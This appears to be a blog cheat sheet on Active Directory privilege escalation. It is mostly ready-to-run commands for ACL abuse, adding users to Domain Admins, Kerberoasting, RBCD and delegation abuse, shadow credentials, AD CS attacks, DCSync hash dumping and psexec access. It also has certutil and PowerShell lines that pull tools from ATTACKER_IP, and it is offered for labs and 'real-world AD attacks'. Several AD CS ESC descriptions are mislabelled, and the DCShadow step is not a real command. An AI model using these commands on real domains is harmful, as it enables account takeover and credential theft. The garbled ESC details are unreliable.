---
layout: post
title: "Active Directory PrivEsc Cheatsheet"
subtitle: "ACL abuses, delegations, AD CS, RBCD, Shadow Credentials, and domain privilege escalation paths"
tags: [active-directory, privesc, windows, escalation, cheatsheet, htb, ctf, redteam]
---

A focused cheat sheet for Active Directory privilege escalation, covering ACL abuses, AD CS attacks, delegation flaws, RBCD, shadow credentials, and domain takeover paths.

---

# 0. ESSENTIAL TOOLS FOR AD PRIVESC

## Core Tools
- **BloodHound**: https://github.com/BloodHoundAD/BloodHound  
- **SharpHound** (ingestor): https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors  
- **PowerView**: https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon  
- **Rubeus**: https://github.com/GhostPack/Rubeus  
- **Certify / ForgeCert (AD CS attacks)**: https://github.com/GhostPack  
- **Impacket**: https://github.com/fortra/impacket  
- **Krbrelayx / krbrelay**: https://github.com/dirkjanm  
- **pywerview**: https://github.com/the-useless-one/pywerview  

---

# 0.1 QUICK FILE TRANSFER COMMANDS

## Attacker: Host files
```

python3 -m http.server 8000

```

## Victim: Download tools
```

certutil -urlcache -f http://ATTACKER_IP:8000/SharpHound.exe SharpHound.exe
powershell -c "(New-Object Net.WebClient).DownloadFile('http://ATTACKER_IP:8000/PowerView.ps1','PowerView.ps1')"
certutil -urlcache -f http://ATTACKER_IP:8000/Certify.exe Certify.exe
certutil -urlcache -f http://ATTACKER_IP:8000/Rubeus.exe Rubeus.exe

```

---

# 1. ENUMERATING ACLS (DISCRETIONARY ACCESS CONTROL LISTS)

Load PowerView:
```

Import-Module .\PowerView.ps1

```

## View ACL for a user/group/object
```

Get-ObjectACL -Identity <user>

```

## Search for interesting ACLs
```

Invoke-ACLScanner

```

Look for:
- **GenericAll**
- **GenericWrite**
- **WriteOwner**
- **WriteDACL**
- **AllExtendedRights**
- **Self (WriteProperty)**
- **ForceChangePassword**

---

# 2. GENERICALL PRIVESC

If you have **GenericAll** on a user or group:

## Reset password
```

Set-DomainUserPassword -Identity victimuser -AccountPassword (ConvertTo-SecureString "P@ssw0rd!" -AsPlainText -Force)

```

## Add user to privileged group
```

Add-DomainGroupMember -Identity 'Domain Admins' -Members <user>

```

## Change attributes
```

Set-DomainObject -Identity victimuser -Set @{description="owned"}

```

---

# 3. GENERICWRITE PRIVESC

Allows modifying attributes (e.g. logon script or SPNs).

## Abusing logon scripts
```

Set-DomainObject -Identity victimuser -Set @{scriptPath="\attacker\share\payload.bat"}

```

When victim logs in → code execution.

## Abusing SPNs → Kerberoasting
```

Set-DomainObject -Identity victimuser -Set @{servicePrincipalName="ops/whatever"}

```

Then request a Kerberos ticket:
```

Rubeus.exe kerberoast

```

---

# 4. WRITEOWNER PRIVESC

Gives you ownership → you can rewrite ACLs and escalate.

## Take ownership
```

Set-DomainObjectOwner -Identity victimuser -Owner <youruser>

```

## Grant full control
```

Add-DomainObjectACL -TargetIdentity victimuser -Rights All -PrincipalIdentity <youruser>

```

Then reset password or add group membership.

---

# 5. WRITEDACL PRIVESC

Allows editing ACLs directly.

## Grant yourself GenericAll
```

Add-DomainObjectACL -TargetIdentity victimuser -PrincipalIdentity <youruser> -Rights All

```

Then escalate:
```

Set-DomainUserPassword -Identity victimuser -AccountPassword (ConvertTo-SecureString "P@ss" -AsPlainText -Force)

```

---

# 6. FORCECHANGE PASSWORD

Allows resetting password **without knowing old password**.

```

Set-DomainUserPassword -Identity victim -AccountPassword (ConvertTo-SecureString "P@ssw0rd!" -AsPlainText -Force)

```

---

# 7. ALLEXTENDED RIGHTS PRIVESC

Often present on user objects unintentionally.

Notably includes:
- Reset Password  
- Write Members  
- Add/Remove group members  

Example:
```

Add-DomainGroupMember -Identity "Server Admins" -Members <youruser>

```

---

# 8. DELEGATION ATTACKS

# 8.1 UNCONSTRAINED DELEGATION

Machines with unconstrained delegation keep TGTs in memory.

List:
```

Get-DomainComputer -Unconstrained

```

Dump tickets:
```

Rubeus.exe dump

```

If a Domain Admin authenticates → steal TGT.

---

# 8.2 CONSTRAINED DELEGATION

Find:
```

Get-DomainComputer -TrustedToAuth

```

Exploit:
```

Rubeus.exe s4u /user:<svc_user> /impersonateuser:Administrator /msdsspn:<target_service>

```

---

# 8.3 RESOURCE-BASED CONSTRAINED DELEGATION (RBCD)

Most common AD PrivEsc in HTB.

Requires ability to **write msDS-AllowedToActOnBehalfOfOtherIdentity**.

## Add a fake machine account
```

Add-ComputerAccount -Domain corp.local -ComputerName attacker$

```

## Configure RBCD
```

Set-DomainObject -Identity <target_computer> -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity'= $newDescriptor}

```

## Get service ticket
```

Rubeus.exe s4u /user:attacker$ /impersonateuser:Administrator /msdsspn:cifs/<target>

```

Access machine as DA equivalent:
```

psexec.py corp.local/Administrator@target

```

---

# 9. SHADOW CREDENTIALS (KEY CREDENTIAL LINK)

If you can write the attribute **msDS-KeyCredentialLink** → impersonation.

## Add shadow credential
```

pywhisker --target <victim> --action add --domain corp.local --username <youruser> --password <pass>

```

Then get TGT:
```

Rubeus.exe asktgt /user:victim /certificate:cert.pfx

```

---

# 10. AD CS (ACTIVE DIRECTORY CERTIFICATE SERVICES) ATTACKS

List PKI:
```

Certify.exe find

```

## ESC1 – Misconfigured template  
User can request a certificate that allows authentication.

```

Certify.exe request /ca:<CA> /template:<template>

```

## ESC4 – NTLM Relay to AD CS  
Relay NTLM to HTTP endpoints:
```

ntlmrelayx.py --adcs --template DomainController

```

## ESC8 – Vulnerable EKUs  
Templates allow domain authentication without constraints.

## ESC13 – Weak security descriptors  
Allows writing template permissions.

---

# 11. DCSYNC ATTACK

If you have:  
- **Replicating Directory Changes**  
- **Replicating Directory Changes All**  
- **Replicating Directory Changes In Filtered Set**

You can dump hashes from the DC.

## Check with SharpHound
Look for `DCSync` in attack paths.

## Execute
```

secretsdump.py corp.local/user:pass@<DC_IP>

```

---

# 12. DCSHADOW ATTACK

Allows pushing rogue directory updates as DC.

Requirements:
- WriteDACL on domain root  
- WriteProperty / DS-Install-Replica rights  

Execute:
```

PowerShell Empire / DCShadow

```

Push SIDHistory, new credentials, or ACLs.

---

# 13. COMPUTER OBJECT TAKEOVER

If you can modify a computer object:

## Change SPN
```

Set-DomainObject -Identity <computer> -Set @{servicePrincipalName="ops/mine"}

```

## Change msDS-AllowedToActOnBehalfOfOtherIdentity
→ Enables RBCD.

---

# Final Notes

This cheat sheet focuses on domain privilege escalation techniques:

* ACL abuses (GenericAll, WriteDACL, WriteOwner, ForceChangePassword)  
* Delegation attacks: unconstrained, constrained, RBCD  
* Shadow credentials (KeyCredentialLink)  
* AD CS attacks (ESC1–ESC13)  
* DCSync & DCShadow  
* Computer object takeover  
* BloodHound-driven escalation paths  

Suitable for advanced HTB machines, CTFs, OSEP-style labs and real-world AD attacks.

---